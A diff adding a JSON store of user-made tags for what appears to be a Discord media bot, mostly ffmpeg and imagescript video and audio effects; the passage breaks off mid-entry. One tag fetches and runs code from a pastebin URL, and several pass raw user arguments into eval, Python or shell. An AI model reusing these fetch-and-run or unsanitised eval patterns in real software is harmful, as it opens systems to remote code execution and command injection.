@@ -1,0 +1,2732 @@
+{
+  "1": {
+    "script": "https://cdn.discordapp.com/attachments/1124758906376302632/1514337937955885126/bandicam_2026-06-09_21-19-30-150.e1c44417.mp4?ex=6a2b009b&is=6a29af1b&hm=21083d77ba8eebb5ed0ca09941ecf6a853b1d623cbe33c1977673967fe8ae30f& listen to this peak i swear",
+    "ownerId": "unknown",
+    "ownerUsername": "unknown",
+    "createdAt": "2026-06-10T18:57:35.869Z",
+    "updatedAt": "2026-06-10T18:57:35.869Z"
+  },
+  "testcode": {
+    "script": "{eval:{args}}",
+    "ownerId": "unknown",
+    "ownerUsername": "unknown",
+    "createdAt": "2026-06-10T18:57:35.869Z",
+    "updatedAt": "2026-06-11T16:07:53.129Z"
+  },
+  "stag": {
+    "script": "second tag",
+    "ownerId": "unknown",
+    "ownerUsername": "unknown",
+    "createdAt": "2026-06-10T18:57:35.869Z",
+    "updatedAt": "2026-06-10T18:57:35.869Z"
+  },
+  "a": {
+    "script": "{attach:https://cdn.discordapp.com/attachments/1124758906376302632/1514338087952711700/bandicam_2026-06-09_21-19-30-150.mp4?ex=6a2b00bf&is=6a29af3f&hm=7db3a32a1fc1bd59effc778da96385e203da0c086b783a4731170092cc9cdfbe&}",
+    "ownerId": "unknown",
+    "ownerUsername": "unknown",
+    "createdAt": "2026-06-10T18:57:35.869Z",
+    "updatedAt": "2026-06-10T18:57:35.869Z"
+  },
+  "invert": {
+    "script": "{iscript:\nload {iv} i\ninvert i\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-10T18:57:35.869Z",
+    "updatedAt": "2026-06-10T18:57:35.869Z"
+  },
+  "ihtx": {
+    "script": "{ihtx:rotate=180,pitch=5;-7|10|0.4}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-10T19:05:03.343Z",
+    "updatedAt": "2026-06-10T19:05:03.343Z"
+  },
+  "euoa": {
+    "script": "{iscript:\nload {iv} i\ninvert i\nflop i\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-10T19:08:06.835Z",
+    "updatedAt": "2026-06-10T19:08:06.835Z"
+  },
+  "python": {
+    "script": "{py:{arg:0}}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T07:26:14.479Z",
+    "updatedAt": "2026-06-11T07:26:14.479Z"
+  },
+  "py": {
+    "script": "{py:{arg:0}}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T07:26:29.022Z",
+    "updatedAt": "2026-06-11T07:26:29.022Z"
+  },
+  "ffmpeg": {
+    "script": "{runcodetxt:https://pastebin.com/raw/3hxzDGBD}\n{sh:\nload {iv}\n\nsr=$(ffprobe -v error -select_streams a:0 -show_entries stream=sample_rate -of default=nokey=1:noprint_wrappers=1 $FILE_1)\nfr=$(ffprobe -v error -select_streams v:0 -show_entries stream=r_frame_rate -of default=nokey=1:noprint_wrappers=1 $FILE_1)\nd=$(ffprobe -i $FILE_1 -show_entries format=duration -v quiet -of csv=\"p=0\")\nw=$(ffprobe -v error -select_streams v:0 -show_entries stream=width -of default=nw=1:nk=1 $FILE_1)\nh=$(ffprobe -v error -select_streams v:0 -show_entries stream=height -of default=nw=1:nk=1 $FILE_1)\nfc=$(ffprobe -v error -select_streams v:0 -show_entries stream=nb_frames -of default=nokey=1:noprint_wrappers=1 $FILE_1)\n\nffmpeg -i \"$FILE_1\" {arg:*} -pix_fmt yuv420p output/input.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T08:04:33.767Z",
+    "updatedAt": "2026-06-15T18:46:55.987Z"
+  },
+  "math": {
+    "script": "{math:{arg:0}}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T08:22:51.693Z",
+    "updatedAt": "2026-06-11T08:22:51.693Z"
+  },
+  "ks": {
+    "script": "{attach:https://files.catbox.moe/g1jes6.mov}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T08:47:08.330Z",
+    "updatedAt": "2026-06-14T09:56:13.491Z"
+  },
+  "imagescript": {
+    "script": "{imagescript:\nload {iv} i\n{arg:0}\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T11:19:59.792Z",
+    "updatedAt": "2026-06-11T11:19:59.792Z"
+  },
+  "vegaswavetoclankeredchuan": {
+    "script": "`&ihtx wave={arg:0};{arg:1};{math:{arg:0}-({arg:2}*10)};{math:{arg:3}*40};{math:{arg:4}*50};{math:{arg:5}*50}`\n\n`wave={arg:0};{arg:1};{math:{arg:0}-({arg:2}*10)};{math:{arg:3}*40};{math:{arg:4}*50};{math:{arg:5}*50}`\n{ihtx:wave={arg:0};{arg:1};{math:{arg:0}-({arg:2}*10)};{math:{arg:3}*40};{math:{arg:4}*50};{math:{arg:5}*50}|10|0.46}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T12:19:31.763Z",
+    "updatedAt": "2026-06-11T12:19:31.763Z"
+  },
+  "gm7": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\naudiopitch=3;0\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T12:50:27.514Z",
+    "updatedAt": "2026-06-11T12:51:38.355Z"
+  },
+  "gm74": {
+    "script": "{imagescript:\nload {iv} i\ncontrast i -1\nexplode i\naudiopitch=-10;9;14\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T12:53:15.685Z",
+    "updatedAt": "2026-06-11T12:53:15.685Z"
+  },
+  "gm": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\naudiopitch=-12;-5;0;4;7;12\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T13:06:54.106Z",
+    "updatedAt": "2026-06-11T13:07:27.337Z"
+  },
+  "gm0": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i 180\nrealgm4 i\naudiopitch=-10;0;10\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T13:08:29.159Z",
+    "updatedAt": "2026-06-11T13:08:29.159Z"
+  },
+  "gm1": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nhuehsv i 180\naudiopitch=8\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T13:09:05.817Z",
+    "updatedAt": "2026-06-11T13:09:05.817Z"
+  },
+  "gm2": {
+    "script": "{imagescript:\nload {iv} i\ninvertrgb=1;1;0\naudiopitch=-5;0;4\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T13:10:05.581Z",
+    "updatedAt": "2026-06-11T13:10:32.082Z"
+  },
+  "gm3": {
+    "script": "{imagescript:\nload {iv} i\ntvsim i 0.5\nchannelblend=r;0;0\naudiopitch=-6;0\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T13:56:18.351Z",
+    "updatedAt": "2026-06-18T10:11:01.589Z"
+  },
+  "db": {
+    "script": "{imagescript:\nload {iv} i\nchannelblend=r;0;0\ntvsim i 0.75\naudiopitch=-12;-5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T13:58:45.058Z",
+    "updatedAt": "2026-06-11T13:58:45.058Z"
+  },
+  "devilblast": {
+    "script": "{imagescript:\nload {iv} i\nchannelblend=r;0;0\ntvsim i 0.75\naudiopitch=-12;-5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T13:59:29.522Z",
+    "updatedAt": "2026-06-11T13:59:29.522Z"
+  },
+  "devilsblast": {
+    "script": "{imagescript:\nload {iv} i\nchannelblend=r;0;0\ntvsim i 0.75\naudiopitch=-12;-5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T13:59:35.245Z",
+    "updatedAt": "2026-06-11T13:59:35.245Z"
+  },
+  "devil_blast": {
+    "script": "{imagescript:\nload {iv} i\nchannelblend=r;0;0\ntvsim i 0.75\naudiopitch=-12;-5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T13:59:38.261Z",
+    "updatedAt": "2026-06-11T13:59:38.261Z"
+  },
+  "devils_blast": {
+    "script": "{imagescript:\nload {iv} i\nchannelblend=r;0;0\ntvsim i 0.75\naudiopitch=-12;-5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T13:59:41.362Z",
+    "updatedAt": "2026-06-11T13:59:41.362Z"
+  },
+  "ihtx_custom_ffmpeg": {
+    "script": "⚠️ Warning: Make sure you use `&t sync` afterwards to make sure the video is synced to the audio\n{sh:\nload {iv}\n\nsr=$(ffprobe -v error -select_streams a:0 -show_entries stream=sample_rate -of default=nokey=1:noprint_wrappers=1 $FILE_1)\nfr=$(ffprobe -v error -select_streams v:0 -show_entries stream=r_frame_rate -of default=nokey=1:noprint_wrappers=1 $FILE_1)\nd=$(ffprobe -i $FILE_1 -show_entries format=duration -v quiet -of csv=\"p=0\")\nw=$(ffprobe -v error -select_streams v:0 -show_entries stream=width -of default=nw=1:nk=1 $FILE_1)\nh=$(ffprobe -v error -select_streams v:0 -show_entries stream=height -of default=nw=1:nk=1 $FILE_1)\nfc=$(ffprobe -v error -select_streams v:0 -show_entries stream=nb_frames -of default=nokey=1:noprint_wrappers=1 $FILE_1)\n\nffmpeg -y -i $FILE_1 -vf trim=end={arg:1} -c:v libx264 -c:a aac -af atrim=end={arg:1} 1.mp4\n\npower={arg:0}\nfor i in $(seq 2 $((power + 1))); do\n  prev=$((i-1))\n  ffmpeg -y -i ${prev}.mp4 {arg:2+} -t {arg:1} -preset ultrafast -crf 23 -pix_fmt yuv420p ${i}.mp4\ndone\n\nfor i in $(seq 2 $((power + 1))); do\n  echo \"file '${i}.mp4'\" >> list.txt\ndone\nffmpeg -y -f concat -safe 0 -i list.txt -c:v libx264 -preset ultrafast -crf 23 -pix_fmt yuv420p -c:a aac ./output/ihtx.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T14:00:18.259Z",
+    "updatedAt": "2026-06-20T17:50:56.957Z"
+  },
+  "gm4": {
+    "script": "{imagescript:\nload {iv} i\ngm4 i\naudiopitch=0;5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T14:00:19.863Z",
+    "updatedAt": "2026-06-11T14:00:19.863Z"
+  },
+  "realgm4": {
+    "script": "{imagescript:\nload {iv} i\nrealgm4 i\naudiopitch=0;5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T14:00:51.633Z",
+    "updatedAt": "2026-06-11T14:00:51.633Z"
+  },
+  "chips": {
+    "script": "https://cdn.discordapp.com/attachments/1124758906376302632/1514630649896763592/snip.03c9074d.mp4?ex=6a2c1137&is=6a2abfb7&hm=5ffceefa655c48a6f67213a530ef42b537de21fb1955bb11f348070503245c9c& no",
+    "ownerId": "1468011130755748084",
+    "ownerUsername": "yeol131313",
+    "createdAt": "2026-06-11T14:02:12.703Z",
+    "updatedAt": "2026-06-11T14:02:12.703Z"
+  },
+  "gm5": {
+    "script": "{imagescript:\nload {iv} i\ninvertrgb=0;1;1\npitch=0;4\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T14:03:31.935Z",
+    "updatedAt": "2026-06-11T14:03:31.935Z"
+  },
+  "gm10": {
+    "script": "{imagescript:\nload {iv} i \nmirror=90 \ninvert i\nhuehsv=180 \nswapuv i \naudiopitch=-12;-13;-5;-6;-1;0;4;4;7;8;11;12\n}",
+    "ownerId": "1212851674134225009",
+    "ownerUsername": "unknown333333_",
+    "createdAt": "2026-06-11T14:07:01.417Z",
+    "updatedAt": "2026-06-11T14:07:01.417Z"
+  },
+  "gm6": {
+    "script": "{imagescript:\nload {iv} i\ninvert i\nthreshold i 90\ninvert i\npitch=0;-8\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T14:10:05.181Z",
+    "updatedAt": "2026-06-12T15:32:47.885Z"
+  },
+  "realgm4_supercubed": {
+    "script": "{imagescript: \nload {iv} i \nrealgm4 i\nrealgm4 i\nrealgm4 i\nrealgm4 i\nrealgm4 i\naudiopitch=0;5;5;10;5;10;10;15;5;10;10;15;10;15;15;20;5;10;10;15;10;15;15;20;10;15;15;20;15;20;20;25\n}",
+    "ownerId": "1212851674134225009",
+    "ownerUsername": "unknown333333_",
+    "createdAt": "2026-06-11T14:13:41.183Z",
+    "updatedAt": "2026-06-11T14:13:41.183Z"
+  },
+  "gm8": {
+    "script": "{imagescript:\nload {iv} i\nthreshold i 70\ninvert i\nhuehsv i 180\npitch=0;-7\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T14:13:44.597Z",
+    "updatedAt": "2026-06-12T15:39:21.408Z"
+  },
+  "gm9": {
+    "script": "{imagescript:\nload {iv} i\nlut=https://files.catbox.moe/1i8wvw.cube\npitch=-12;0;5;7\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T14:18:54.500Z",
+    "updatedAt": "2026-06-18T18:22:28.602Z"
+  },
+  "phasedeffect13.0": {
+    "script": "{imagescript:\nload {iv} \ngradientmap=[[0,200,150,255],[255,255,255,255],[255,255,255,255],[0,0,0,255]]\nautotune=https://cdn.discordapp.com/attachments/1124758906376302632/1514218249389347026/snip.e6773357.mp3?ex=6a2be2a3&is=6a2a9123&hm=2530a41396a22f9c63729039e7f7c90df796b29614f0a3db1bc6cd029d33d7b1&\nvolume=10\n}",
+    "ownerId": "1212851674134225009",
+    "ownerUsername": "unknown333333_",
+    "createdAt": "2026-06-11T14:28:36.186Z",
+    "updatedAt": "2026-06-11T14:34:37.304Z"
+  },
+  "gm7_ffmpeg": {
+    "script": "{sh:\nload {iv}\nffmpeg -i \"$FILE_1\" -vf negate -filter_complex \"[0:a]rubberband=formant=712923000:pitch=2^(3/12)[a1];[0:a]rubberband=formant=712923000:pitch=2^(0/12)[a2];[a1][a2]amix=2,volume=2,atrim=0.02[outa]\" -map 0:v -map \"[outa]\" output/out.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T14:32:47.479Z",
+    "updatedAt": "2026-06-11T14:32:47.479Z"
+  },
+  "gm1_ffmpeg": {
+    "script": "{sh:\nload {iv}\nffmpeg -i \"$FILE_1\" -vf hue=h=180,negate -af rubberband=pitch=2^0.6666666666666666666666666666666666666666666666666666666666666667 output/out.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T14:35:11.385Z",
+    "updatedAt": "2026-06-11T14:59:46.491Z"
+  },
+  "gm301": {
+    "script": "{sh:\nload {iv}invlum,fisheye=1,pitch=-10;9;14, channelblend=b;g;r, saturation=50, gradientmap=[[0,0,0,0],[0,0,0,0],[0,0,0,255]],pitch=0;3;6;9;12,gradientmap=[[255,255,255,255],[255,0,0,255],[0,0,0,255]],pitch=5;10;14.19,channelblend=b;g;r,huehsv=-130,tvsim=0.20,pitch=-12;-11.7;0;0.3,huehsv=-120,rotate=-90,mirror=-90,rotate=90,pitch=-3,invert,saturation=-100,flip,mirror=-90,pitch=14\noutput/out.mp4\n}",
+    "ownerId": "1495491451545714790",
+    "ownerUsername": "lyubov.vsevolod_28553",
+    "createdAt": "2026-06-11T14:39:11.778Z",
+    "updatedAt": "2026-06-11T14:41:31.667Z"
+  },
+  "l": {
+    "script": "ist",
+    "ownerId": "1056191069206876161",
+    "ownerUsername": "amtve",
+    "createdAt": "2026-06-11T14:42:47.480Z",
+    "updatedAt": "2026-06-11T14:42:47.480Z"
+  },
+  "gm301fix!": {
+    "script": "{sh:\nload {iv}invlum,fisheye=1,pitch=-10;9;14, channelblend=b;g;r, saturation=50, gradientmap=[[0,0,0,0],[0,0,0,0],[0,0,0,255]],pitch=0;3;6;9;12,gradientmap=[[255,255,255,255],[255,0,0,255],[0,0,0,255]],pitch=5;10;14.19,channelblend=b;g;r,huehsv=-130,tvsim=0.20,pitch=-12;-11.7;0;0.3,huehsv=-120,rotate=-90,mirror=-90,rotate=90,pitch=-3,invert,saturation=-100,flip,mirror=-90,pitch=14\noutput/gm301.mp4\n}",
+    "ownerId": "1514623056834986195",
+    "ownerUsername": "expirou2",
+    "createdAt": "2026-06-11T14:42:58.231Z",
+    "updatedAt": "2026-06-11T14:42:58.231Z"
+  },
+  "gm87": {
+    "script": "{imagescript: \nload {iv}\nfisheye=0.75 \ninvlum i\ngm4 i\nswapuv i\nsaturation=1.5\naudiopitch=-10;-7;-4;-1;2;9;12;15;18;21;14;17;20;23;26\n}",
+    "ownerId": "1212851674134225009",
+    "ownerUsername": "unknown333333_",
+    "createdAt": "2026-06-11T14:46:05.010Z",
+    "updatedAt": "2026-06-11T14:46:05.010Z"
+  },
+  "wiggle_major": {
+    "script": "{imagescript: \nload {iv} \nwave=2;0;(5/9*16)*T/vd;0;0;0;6\nwave=0;2;0;5*T/vd;0;0;6\nhuehsv=-46.666666666\nhue=-13.333333333\naudiopitch=-2;-0.33;11.66\n}",
+    "ownerId": "1212851674134225009",
+    "ownerUsername": "unknown333333_",
+    "createdAt": "2026-06-11T15:04:18.366Z",
+    "updatedAt": "2026-06-11T15:08:11.042Z"
+  },
+  "join": {
+    "script": "{imagescript:\nload {iv} i\nload https://cdn.discordapp.com/attachments/1124758906376302632/1514647384393650266/youtube-a3ICNMQW7Ok.9cf5f033.mp4?ex=6a2c20cd&is=6a2acf4d&hm=fe5f9abcc3440913254533213704b82eacccbfa648a937a3cd3dc9493eb5caca& i2\njoin i i2\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T15:10:12.428Z",
+    "updatedAt": "2026-06-11T15:10:12.428Z"
+  },
+  "kcw": {
+    "script": "{attach:https://files.catbox.moe/8fodor.mov}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T15:11:39.934Z",
+    "updatedAt": "2026-06-14T09:56:30.701Z"
+  },
+  "c/g_major": {
+    "script": "{imagescript: \nload {iv} i\ninvert i\nhue=120\naudiopitch=-12;-5;-3;0;4;7\n}",
+    "ownerId": "1264800797292756992",
+    "ownerUsername": "amberthebear583",
+    "createdAt": "2026-06-11T15:16:12.493Z",
+    "updatedAt": "2026-06-11T15:16:12.493Z"
+  },
+  "angry": {
+    "script": "{imagescript: load {iv} i \nswapuv i\nhuehsv=60\nInvert\nmirror=90\nfisheye=-0.875\nadestroy\npitch=0;-2\n}",
+    "ownerId": "1498718091734024355",
+    "ownerUsername": "sm14cheryl_84874",
+    "createdAt": "2026-06-11T15:31:03.631Z",
+    "updatedAt": "2026-06-11T15:32:03.836Z"
+  },
+  "echo": {
+    "script": "{sh: echo \"{arg:0}\"}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T15:41:10.871Z",
+    "updatedAt": "2026-06-11T15:41:18.448Z"
+  },
+  "center-effects-fixed": {
+    "script": "{imagescript:load {iv} 1\nget 1 width w\nget 1 height h\ncopy 1 2\ncopy 1 3\ncopy 1 4\ncopy 1 5\nforeachframe 1 0 1fc \"rotate 1x (180*(idx/1fc)) none true\"\nrotate 1 90\nwave 1 -h/9 w/1.75\nrotate 1 -90\ncover 1 w h\ncopy 1 1$\nconvert 1$ audio/wav\naudiopitch 1$ 2**(-4/12)\nrepeatduration 1$ 1d\naudioputreplace 1 1$\nhueshifthsv 2 65\nexplode 2 1.5\nrotate 2 90\nwave 2 h/8 w/3.6\nrotate 2 -90\ncover 2 w h\nwave 2 -h/12 w/2\ncover 2 w h\ncopy 2 2$\nconvert 2$ audio/wav\naudiopitch 2$ 2**(6/12)\nrepeatduration 2$ 2d\naudioputreplace 2 2$\nhueshifthsv 3 -90\ndetunnel 3\nwiggle 3 right 30 4\ntunnel 3\ncopy 3 3$\nconvert 3$ audio/wav\naudiopitch 3$ 2**(-6/12)\nrepeatduration 3$ 3d\naudioputreplace 3 3$\nhaah 4\nforeachframe 4 0 4fc \"swirl 4x (-90*((idx-4fc)/4fc))\"\naudiopitch 4 2**(-8/12)\nbitrate 4 0 32000\ngrayscale 5\nhuecurvergba 5 red 0 0 0 0\nhuecurvergba 5 green 0.5 0 0 0\nhuecurvergba 5 blue 0.5 0.2 0.7 1\ncopy 5 5$\nconvert 5$ audio/wav\naudiopitch 5$ 2**(-2/12)\nrepeatduration 5$ 5d\naudioputreplace 5 5$\nconcatmultiple 1 2 3 4 5}",
+    "ownerId": "1439196394673147905",
+    "ownerUsername": "yanis2206",
+    "createdAt": "2026-06-11T15:46:56.953Z",
+    "updatedAt": "2026-06-11T15:49:11.617Z"
+  },
+  "gm4_powers": {
+    "script": "{imagescript:\nload {iv} i\nrealgm4 i\naudiopitch=0;5\ncopy i i2 \nrealgm4 i2\naudiopitch=0;5 \ncopy i2 i3\nrealgm4 i3\naudiopitch=0;5\ncopy i3 i4 \nrealgm4 i4\naudiopitch=0;5 \ncopy i4 i5 \nrealgm4 i5\naudiopitch=0;5\ncopy i5 i6\nrealgm4 i6\naudiopitch=0;5 \ncopy i6 i7 \nrealgm4 i7\naudiopitch=0;5\ncopy i7 i8 \nrealgm4 i8\naudiopitch=0;5 \ncopy i8 i9 \nrealgm4 i9\naudiopitch=0;5\ncopy i9 i10\nrealgm4 i10\naudiopitch=0;5\nconcatmultiple i i2 i3 i4 i5 i6 i7 i8 i9 i10\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T16:31:11.605Z",
+    "updatedAt": "2026-06-11T16:31:11.605Z"
+  },
+  "vebfisheye": {
+    "script": "{sh:\nREPEATS={arg:0}\nFILTER=\"v360=e:ball,scale=iw:ih/2,setsar=1:1\"\nCHAIN=$(printf \"$FILTER,\"%.0s $(seq 1 $REPEATS) | sed 's/,$//')\nload {iv}\n\nffmpeg -i \"$FILE_1\" -vf \"$CHAIN\" output/out.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T16:56:16.231Z",
+    "updatedAt": "2026-06-12T07:33:57.271Z"
+  },
+  "vebdefisheye": {
+    "script": "{sh:\nREPEATS={arg:0}\nFILTER=\"v360=ball:e,scale=iw:ih*2,setsar=1:1\"\nCHAIN=$(printf \"$FILTER,\"%.0s $(seq 1 $REPEATS) | sed 's/,$//')\nload {iv}\n\nffmpeg -i \"$FILE_1\" -vf \"$CHAIN\" output/out.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T17:03:18.394Z",
+    "updatedAt": "2026-06-12T07:34:48.985Z"
+  },
+  "wii": {
+    "script": "{attach:https://files.catbox.moe/rczdp6.mp4}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T17:08:16.323Z",
+    "updatedAt": "2026-06-14T09:55:59.285Z"
+  },
+  "bgm74": {
+    "script": "{sh:\nload {iv}\nffmpeg -i \"$FILE_1\" -vf negate,hue=h=180,lenscorrection=0.5:0.5:0.3:0.9,lenscorrection=0.5:0.5:-0.1:-0.3,lenscorrection=0.5:0.5:-0.1:-0.3 -filter_complex \"[0:a]rubberband=formant=634:pitch=2^(-3/12)[a1];[0:a]rubberband=formant=634:pitch=2^(2/12)[a2];[a1][a2]amix=2,volume=1.75,atrim=0.01[outa]\" -map 0:v -map \"[outa]\" output/out.mp4\n}",
+    "ownerId": "1510601340638990337",
+    "ownerUsername": "jose917372",
+    "createdAt": "2026-06-11T17:14:51.550Z",
+    "updatedAt": "2026-06-11T17:14:51.550Z"
+  },
+  "bh2001's_gm74": {
+    "script": "{sh:\nload {iv}\nffmpeg -i \"$FILE_1\" -vf negate,hue=h=180,lenscorrection=0.5:0.5:0.3:0.9,lenscorrection=0.5:0.5:-0.1:-0.3,lenscorrection=0.5:0.5:-0.1:-0.3 -filter_complex \"[0:a]rubberband=formant=634:pitch=2^(-3/12)[a1];[0:a]rubberband=formant=634:pitch=2^(2/12)[a2];[a1][a2]amix=2,volume=1.75,atrim=0.01[outa]\" -map 0:v -map \"[outa]\" output/out.mp4\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T17:14:59.687Z",
+    "updatedAt": "2026-06-11T17:14:59.687Z"
+  },
+  "ihtxfc": {
+    "script": "{if:{tag:745467049572082899}|=|true|then:{js:console.error(`You are currently banned from using this tag`)}|else:\n{set:string|{substring:{args}|{indexof:{arg:2}|{args}}}}\n{set:vidlen|{sh:\nload {iv}\nffprobe -i $FILE_1 -show_entries format=duration -v quiet -of csv=\"p=0\"\n}}\n{set:time|{if:{arg:1}|=|vidlen|then:{get:vidlen}|else:{arg:1}}}\n\n{set:code|\nload {iv}\n\n{js:const n = {arg:0};\nconst time = parseFloat(`{get:time}`.trim());\nconst segdur = time / n;\nconst segs = [...Array(n)].map((_, i) => `ffmpeg -i $FILE_1 -ss ${i * segdur} -t ${segdur} {get:string} ${i+1}.ts`);\nconst concat = [...Array(n)].map((_, i) => `${i+1}.ts`).join(\"|\");\nsegs.forEach(s => console.log(s));\nconsole.log(`ffmpeg -i \"concat:${concat}\" ./output/ihtx_custom.mp4`);\n}}\n⚠️ Warning: Make sure you use `.t sync` afterwards to make sure the video is synced to the audio\n{sh:{js:console.log(`{get:code}`)}}\n}",
+    "ownerId": "1510601340638990337",
+    "ownerUsername": "jose917372",
+    "createdAt": "2026-06-11T17:19:12.724Z",
+    "updatedAt": "2026-06-11T17:19:12.724Z"
+  },
+  "what": {
+    "script": "!??",
+    "ownerId": "1246534277382803489",
+    "ownerUsername": "notevenalogoeditor2638",
+    "createdAt": "2026-06-11T17:49:27.414Z",
+    "updatedAt": "2026-06-11T17:49:27.414Z"
+  },
+  "ruby": {
+    "script": "triple whopper",
+    "ownerId": "1334532163261173836",
+    "ownerUsername": "ruby80056",
+    "createdAt": "2026-06-11T17:50:22.911Z",
+    "updatedAt": "2026-06-11T17:50:22.911Z"
+  },
+  "sapfc": {
+    "script": "{set:#|0}\n&t icf 10 0.46 -filter_complex \"{foreach:{argslen}|[0:a]rubberband=formant=712923000:pitch=2^({arg:{get:#}}/12){set:#|{math:{get:#}+1}}[a{get:#}];}{set:#|0}{foreach:{argslen}|{set:#|{math:{get:#}+1}}[a{get:#}]}amix={argslen},volume={argslen},atrim=0.02[outa]\" -map 0:v -map \"[outa]\"",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-11T18:18:30.725Z",
+    "updatedAt": "2026-06-13T06:52:21.871Z"
+  },
+  "gm11": {
+    "script": "{imagescript:\nload {iv} i\nmirror i 270\ngrayscale i\ninvert i\npitch=14\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T18:22:44.318Z",
+    "updatedAt": "2026-06-11T18:22:44.318Z"
+  },
+  "gm12": {
+    "script": "{imagescript:\nload {iv} i\nhuehsv i -45\nsaturation i 2\ngm4 i\npitch=-9;-2;3;7;10;15\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T18:29:38.952Z",
+    "updatedAt": "2026-06-11T18:30:08.076Z"
+  },
+  "gm13": {
+    "script": "{imagescript:\nload {iv} i\nswapuv i\nsaturation i 1.5\ngm4 i\npitch=0;3;6;9;12\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T18:33:32.405Z",
+    "updatedAt": "2026-06-11T18:33:32.405Z"
+  },
+  "gm14": {
+    "script": "{imagescript:\nload {iv} i\nmirror i 90\nmirror i\ninvert i\nchannelblend=0;0;b\npitch=-12;0;16\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T18:38:29.051Z",
+    "updatedAt": "2026-06-11T18:38:42.315Z"
+  },
+  "gm15": {
+    "script": "{imagescript:\nload {iv} i\nwave=0;8;0;2;31;31\npitch=0;5\nacontrast=100\nacontrast=100\nacontrast=100\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T18:46:23.390Z",
+    "updatedAt": "2026-06-11T18:46:23.390Z"
+  },
+  "cryingx": {
+    "script": "{imagescript:\nload {iv} i\nwave=0;8;0;2;31;31\nhue i -135\ninvert i\npitch=0;-5\n}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-11T18:49:18.059Z",
+    "updatedAt": "2026-06-15T13:26:02.072Z"
+  },
+  "crying_x": {
